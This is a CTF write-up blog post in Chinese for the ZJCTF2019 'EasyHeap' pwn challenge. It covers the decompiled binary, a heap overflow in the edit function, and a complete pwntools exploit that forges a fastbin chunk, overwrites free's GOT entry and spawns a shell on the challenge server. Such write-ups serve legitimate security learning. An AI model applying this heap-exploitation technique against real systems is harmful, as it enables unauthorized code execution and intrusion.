@@ -1,0 +1,403 @@
+---
+layout: post
+title:  EasyHeap
+date:   2021-02-09 00:01:01 +0300
+image:  2021-02-09-poppy.jpg
+tags:   [ctf,PWN,ZJCTF2019,heap]
+---
+
+#### main()
+
+```assembly
+int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  char buf; // [rsp+0h] [rbp-10h]
+  unsigned __int64 v5; // [rsp+8h] [rbp-8h]
+
+  v5 = __readfsqword(0x28u);
+  setvbuf(stdout, 0LL, 2, 0LL);
+  setvbuf(stdin, 0LL, 2, 0LL);
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      menu();
+      read(0, &buf, 8uLL);
+      v3 = atoi(&buf);
+      if ( v3 != 3 )
+        break;
+      delete_heap();
+    }
+    if ( v3 > 3 )
+    {
+      if ( v3 == 4 )
+        exit(0);
+      if ( v3 == 4869 )
+      {
+        if ( (unsigned __int64)magic <= 0x1305 )
+        {
+          puts("So sad !");
+        }
+        else
+        {
+          puts("Congrt !");
+          l33t();
+        }
+      }
+      else
+      {
+LABEL_17:
+        puts("Invalid Choice");
+      }
+    }
+    else if ( v3 == 1 )
+    {
+      create_heap();
+    }
+    else
+    {
+      if ( v3 != 2 )
+        goto LABEL_17;
+      edit_heap();
+    }
+  }
+}
+```
+
+#### menu()
+
+```assembly
+int menu()
+{
+  puts("--------------------------------");
+  puts("       Easy Heap Creator       ");
+  puts("--------------------------------");
+  puts(" 1. Create a Heap               ");
+  puts(" 2. Edit a Heap                 ");
+  puts(" 3. Delete a Heap               ");
+  puts(" 4. Exit                        ");
+  puts("--------------------------------");
+  return printf("Your choice :");
+}
+```
+
+#### create()
+
+```assembly
+unsigned __int64 create_heap()
+{
+  signed int i; // [rsp+4h] [rbp-1Ch]
+  size_t size; // [rsp+8h] [rbp-18h]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  for ( i = 0; i <= 9; ++i )
+  {
+    if ( !heaparray[i] )
+    {
+      printf("Size of Heap : ");
+      read(0, &buf, 8uLL);
+      size = atoi(&buf);
+      heaparray[i] = malloc(size);
+      if ( !heaparray[i] )
+      {
+        puts("Allocate Error");
+        exit(2);
+      }
+      printf("Content of heap:", &buf);
+      read_input(heaparray[i], size);
+      puts("SuccessFul");
+      return __readfsqword(0x28u) ^ v4;
+    }
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+#### edit()
+
+```assembly
+unsigned __int64 edit_heap()
+{
+  __int64 v0; // ST08_8
+  int v2; // [rsp+4h] [rbp-1Ch]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v4; // [rsp+18h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, &buf, 4uLL);
+  v2 = atoi(&buf);
+  if ( v2 < 0 || v2 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( heaparray[v2] )
+  {
+    printf("Size of Heap : ", &buf);
+    read(0, &buf, 8uLL);
+    v0 = atoi(&buf);
+    printf("Content of heap : ", &buf);
+    read_input(heaparray[v2], v0);
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v4;
+}
+```
+
+在修改内容的时候要求我们重新输入内容的大小size，而且没有和create时的大小size比较，因此存在溢出漏洞，可以利用其来覆盖其他堆块的内容。
+
+#### read_input()
+
+```assembly
+ssize_t __fastcall read_input(void *a1, size_t a2)
+{
+  ssize_t result; // rax
+
+  result = read(0, a1, a2);
+  if ( (signed int)result <= 0 )
+  {
+    puts("Error");
+    _exit(-1);
+  }
+  return result;
+}
+```
+
+第一个参数前加了*，表示该变量储存的地址上的数据。
+
+#### delete()
+
+```assembly
+unsigned __int64 delete_heap()
+{
+  int v1; // [rsp+Ch] [rbp-14h]
+  char buf; // [rsp+10h] [rbp-10h]
+  unsigned __int64 v3; // [rsp+18h] [rbp-8h]
+
+  v3 = __readfsqword(0x28u);
+  printf("Index :");
+  read(0, &buf, 4uLL);
+  v1 = atoi(&buf);
+  if ( v1 < 0 || v1 > 9 )
+  {
+    puts("Out of bound!");
+    _exit(0);
+  }
+  if ( heaparray[v1] )
+  {
+    free(heaparray[v1]);
+    heaparray[v1] = 0LL;
+    puts("Done !");
+  }
+  else
+  {
+    puts("No such heap !");
+  }
+  return __readfsqword(0x28u) ^ v3;
+}
+```
+
+free堆块，而且指针置0，因此不存在UAF漏洞。
+
+#### 133t()
+
+```assembly
+int l33t()
+{
+  return system("cat /home/pwn/flag");
+}
+```
+
+将heaparray[]的地址改为free()的got地址，再使用程序的edit功能将free的got地址改为system地址。这样之后free()堆块就相当于执行system()，创建一个内容为'/bin/sh'的堆块，free()这个堆块即为执行system('/bin/sh')。
+
+```assembly
+from pwn import *
+
+elf = ELF("./easyheap")
+
+io = remote("node3.buuoj.cn",25020)
+
+def create(size, content):
+    io.recvuntil("Your choice :")
+    io.sendline(str(1))
+    io.recvuntil("Size of Heap : ")
+    io.sendline(str(size))
+    io.recvuntil("Content of heap:")
+    io.sendline(content)
+
+def edit(index, size, content):
+    io.recvuntil("Your choice :")
+    io.sendline(str(2))
+    io.recvuntil("Index :")
+    io.sendline(str(index))
+    io.recvuntil("Size of Heap : ")
+    io.sendline(str(size))
+    io.recvuntil("Content of heap : ")
+    io.sendline(content)
+
+def delete(index):
+    io.recvuntil("Your choice :")
+    io.sendline(str(3))
+    io.recvuntil("Index :")
+    io.sendline(str(index))
+
+# create(0x10, "a"*0x10)
+# create(0x80, "b"*0x10)
+# create(0x80, "c"*0x10)
+# '''
+# 0x010 [    ][0x21] 0
+# 0x020 [    ][    ]
+# 0x030 [    ][0x91] 1
+# 0x040 [    ][    ]
+# 0x050 [    ][    ]
+# 0x060 [    ][    ]
+# 0x070 [    ][    ]
+# 0x080 [    ][    ]
+# 0x090 [    ][    ]
+# 0x0A0 [    ][    ]
+# 0x0B0 [    ][    ]
+# 0x0C0 [    ][0x91] 2
+# 0x0D0 [    ][    ]
+# 0x0E0 [    ][    ]
+# 0x0F0 [    ][    ]
+# 0x100 [    ][    ]
+# 0x110 [    ][    ]
+# 0x120 [    ][    ]
+# 0x130 [    ][    ]
+# 0x140 [    ][    ]
+#      top chunk
+# '''
+
+# magic = 0x6020C0 - 0x10
+# delete(1)
+# edit(0, 0x30, "d"*0x18+p64(0x91)+p64(0)+p64(magic))
+# '''
+# 0x010 [        ][  0x21  ] 0
+# 0x020 [dddddddd][dddddddd]
+# 0x030 [dddddddd][  0x91  ] 1 #
+# 0x040 [        ][  magic ]   #
+# 0x050 [        ][        ]   #
+# 0x060 [        ][        ]   #
+# 0x070 [        ][        ]   #
+# 0x080 [        ][        ]   #
+# 0x090 [        ][        ]   #
+# 0x0A0 [        ][        ]   #
+# 0x0B0 [        ][        ]   #
+# 0x0C0 [        ][  0x91  ] 2
+# 0x0D0 [        ][        ]
+# 0x0E0 [        ][        ]
+# 0x0F0 [        ][        ]
+# 0x100 [        ][        ]
+# 0x110 [        ][        ]
+# 0x120 [        ][        ]
+# 0x130 [        ][        ]
+# 0x140 [        ][        ]
+#      top chunk
+# '''
+
+# create(0x80, "e"*0x10)
+# io.recvuntil("Your choice :")
+# io.sendline("4869")
+
+create(0x10, "a"*0x10)
+create(0x10, "b"*0x10)
+create(0x60, "c"*0x10)
+create(0x10, "/bin/sh\x00")
+'''
+0x10 [           ][   0x21   ] 0
+0x20 [ aaaaaaaa  ][ aaaaaaaa ]
+0x30 [           ][   0x21   ] 1
+0x40 [ bbbbbbbb  ][ bbbbbbbb ]
+0x50 [           ][   0x71   ] 2
+0x60 [ cccccccc  ][ cccccccc ]
+0x70 [           ][          ]
+0x80 [           ][          ]
+0x90 [           ][          ]
+0xA0 [           ][          ]
+0xB0 [           ][          ]
+0xC0 [           ][   0x21   ] 3
+0xD0 [/bin/sh\x00][          ]
+     top chunk
+'''
+
+fake_chunk = 0x6020ad
+delete(2)
+edit(1, 0x30, 'a'*0x10+p64(0)+p64(0x71)+p64(fake_chunk)+p64(0))
+'''
+0x10 [           ][   0x21   ] 0
+0x20 [ aaaaaaaa  ][ aaaaaaaa ]
+0x30 [           ][   0x21   ] 1
+0x40 [ aaaaaaaa  ][ aaaaaaaa ]
+0x50 [     0     ][   0x71   ] 2  #
+0x60 [ fake_chunk][    0     ]    #
+0x70 [           ][          ]    #
+0x80 [           ][          ]    #
+0x90 [           ][          ]    #
+0xA0 [           ][          ]    #
+0xB0 [           ][          ]    #
+0xC0 [           ][   0x21   ] 3
+0xD0 [/bin/sh\x00][          ]
+     top chunk
+'''
+
+heaparray = 0x6020E0
+free_got = elf.got["free"]
+call_system = 0x400C2C
+'''
+.text:0000000000400C23 ; =============== S U B R O U T I N E ============================
+.text:0000000000400C23
+.text:0000000000400C23 ; Attributes: bp-based frame
+.text:0000000000400C23
+.text:0000000000400C23                 public l33t
+.text:0000000000400C23 l33t            proc near               ; CODE XREF: main+EF↓p
+.text:0000000000400C23 ; __unwind {
+.text:0000000000400C23                 push    rbp
+.text:0000000000400C24                 mov     rbp, rsp
+.text:0000000000400C27                 mov     edi, offset command ; "cat /home/pwn/flag"
+.text:0000000000400C2C                 call    _system
+.text:0000000000400C31                 nop
+.text:0000000000400C32                 pop     rbp
+.text:0000000000400C33                 retn
+.text:0000000000400C33 ; } // starts at 400C23
+.text:0000000000400C33 l33t            endp
+'''
+create(0x60, "d"*0x10)
+'''
+0x10 [           ][   0x21   ] 0
+0x20 [           ][          ]
+0x30 [           ][   0x21   ] 1
+0x40 [ aaaaaaaa  ][ aaaaaaaa ]
+0x50 [     0     ][   0x71   ] 2
+0x60 [ fake_chunk][    0     ]
+0x70 [           ][          ]
+0x80 [           ][          ]
+0x90 [           ][          ]
+0xA0 [           ][          ]
+0xB0 [           ][          ]
+0xC0 [           ][   0x21   ] 3
+0xD0 [/bin/sh\x00][          ]
+     top chunk
+'''
+
+payload = "e"*(heaparray - (0x10 + fake_chunk)) + p64(free_got)
+create(0x60, payload)
+edit(0, 0x8, p64(call_system))
+
+delete(3)
+
+io.interactive()
+```
+
+在heaparray之前找fake_chunk
+
+![]({{site.baseurl}}/img/2021-02-09-fakechunk.jpg)
+
+利用7f来伪造大小为0x70的fastbin。
